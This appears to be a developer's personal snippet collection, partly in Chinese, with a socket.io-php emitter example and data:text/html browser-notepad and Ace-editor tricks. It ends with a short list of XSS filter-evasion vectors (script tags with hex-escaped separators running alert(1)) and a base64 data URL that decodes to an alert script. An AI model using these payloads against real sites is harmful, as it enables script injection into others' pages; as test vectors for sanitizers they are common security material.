###[socket.io-php](https://github.com/rase-/socket.io-php-emitter)
```js
$redis = new \Redis(); // Using the Redis extension provided client
$redis->connect('127.0.0.1', '6379');
$emitter = new SocketIO\Emitter($redis);
$emitter->emit('event', 'payload str');
$emitter = new SocketIO\Emitter(array('port' => '6379', 'host' => '127.0.0.1'));
// broadcast can be replaced by any of the other flags
$emitter->broadcast->emit('other event', 'such data');
```
###[xss data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K](http://www.csdn.net/article/2013-02-01/2814041-1-line-browser-notepad)
```js
    data:text/html, <html contenteditable>  
data:text/html, <textarea style="font-size: 1.5em; width: 100%; height: 100%; border: none; outline: none" autofocus /> 
data:text/html,<html lang="en"><head><style> html,body { height: 100% } #note { width: 100%; height: 100% } </style> <script> var note, html, timeout; window.addEventListener('load', function() { note = document.getElementById('note'); html = document.getElementsByTagName('html')[0]; html.addEventListener('keyup', function(ev) { if (timeout) clearTimeout(timeout); timeout = setTimeout(saveNote, 100); }); restoreNote(); note.focus(); }); function saveNote() { localStorage.note = note.innerText; timeout = null; } function restoreNote() { note.innerText = localStorage.note || ''; } </script> </head><body><h1>Notepad (type below, notes persist)</h1> <p id="note" contenteditable=""></p> </body></html>

data:text/html, <style type="text/css">#e{position:absolute;top:0;right:0;bottom:0;left:0;}</style><div id="e"></div><script src="http://d1n0x3qji82z53.cloudfront.net/src-min-noconflict/ace.js" type="text/javascript" charset="utf-8"></script><script>var e=ace.edit("e");e.setTheme("ace/theme/monokai");e.getSession().setMode("ace/mode/ruby");</script> 

https://gist.github.com/minikomi/4672169

data:text/html, <body><canvas id="dyDraw">你的浏览器不支持HTML5 Canvas</canvas></body><script>function $(id){return document.getElementById(id);} $('dyDraw').width=document.body.clientWidth;$('dyDraw').height=document.body.clientHeight;if(window.addEventListener){window.addEventListener('load',function(){var canvas,canvastext;var hua=false;function dyDrawing(){canvas=$('dyDraw');canvastext=canvas.getContext('2d');canvas.addEventListener('mousedown',canvasMouse,false);canvas.addEventListener('mousemove',canvasMouse,false);window.addEventListener('mouseup',canvasMouse,false);} function canvasMouse(dy){var x,y;if(dy.layerX||dy.layerX==0){x=dy.layerX;y=dy.layerY;}else if(dy.offsetX||dy.offsetX==0){x=dy.offsetX;y=dy.offsetY;} x-=dyDraw.offsetLeft;y-=dyDraw.offsetTop;if(dy.type=='mousedown'){hua=false;canvastext.beginPath();canvastext.moveTo(x,y);hua=true;}else if(dy.type=='mousemove'){if(hua){canvastext.strokeStyle="rgb(255,0,0)";canvastext.lineWidth=9;canvastext.lineTo(x,y);canvastext.stroke();}}else if(dy.type=='mouseup'){hua=false;}} dyDrawing();},false);}</script>

支持各种编程语言的编辑器http://www.cnblogs.com/voidy/p/4276156.html

浏览器地址栏输入以下内容：

data:text/html, <style type="text/css">.e{position:absolute;top:0;right:0;bottom:0;left:0;}</style><div class="e" id="editor"></div><script src="http://d1n0x3qji82z53.cloudfront.net/src-min-noconflict/ace.js" type="text/javascript" charset="utf-8"></script><script>var e=ace.edit("editor");e.setTheme("ace/theme/monokai");e.getSession().setMode("ace/mode/ruby");</script>

更多语言的支持: 将 ace/mode/ruby用以下语言替换：

Markdown -> ace/mode/markdown

Python -> ace/mode/python

C/C++ -> ace/mode/c_cpp

Javscript -> ace/mode/javascript

Java -> ace/mode/java

Scala- -> ace/mode/scala

CoffeeScript -> ace/mode/coffee

and css, html, php, latex, tex, sh, sql, lua, clojure, dart, typescript, go, groovy, json, jsp, less, lisp, lucene, perl, powershell, scss, textile, xml, yaml, xquery, liquid, diff and many more...
想换个主题

将 ace/theme/monokai用下面的替换掉：

Eclipse -> ace/theme/eclipse

GitHub -> ace/theme/github

TextMate -> ace/theme/textmate

and ambiance, dawn, chaos, chrome, dreamweaver, xcode, vibrant_ink, solarized_dark, solarized_light, tomorrow, tomorrow_night, tomorrow_night_blue, twilight, tomorrow_night_eighties, pastel_on_dark and many more..

##想在浏览器编辑Markdown

data:text/html,<style type="text/css">.e{position:absolute;top:0;right:50%;bottom:0;left:0;} .c{position:absolute;overflow:auto;top:0;right:0;bottom:0;left:50%;}</style><div class="e" id="editor"></div><div class="c"></div><script src="http://d1n0x3qji82z53.cloudfront.net/src-min-noconflict/ace.js" type="text/javascript" charset="utf-8"></script><script src="http://cdnjs.cloudflare.com/ajax/libs/showdown/0.3.1/showdown.min.js"></script><script> function showResult(e){consoleEl.innerHTML=e}var e=ace.edit("editor");e.setTheme("ace/theme/monokai");e.getSession().setMode("ace/mode/markdown");var consoleEl=document.getElementsByClassName("c")[0];var converter=new Showdown.converter;e.commands.addCommand({name:"markdown",bindKey:{win:"Ctrl-M",mac:"Command-M"},exec:function(t){var n=e.getSession().getMode().$id;if(n=="ace/mode/markdown"){showResult(converter.makeHtml(t.getValue()))}},readOnly:true})</script>
```
###[XSS vectors](https://gist.github.com/JohannesHoppe/5612274)
```js

<script\x20type="text/javascript">javascript:alert(1);</script>
<script\x3Etype="text/javascript">javascript:alert(1);</script>
<script\x0Dtype="text/javascript">javascript:alert(1);</script>
<script\x09type="text/javascript">javascript:alert(1);</script>
<script\x0Ctype="text/javascript">javascript:alert(1);</script>
<script\x2Ftype="text/javascript">javascript:alert(1);</script>
<script\x0Atype="text/javascript">javascript:alert(1);</script>
```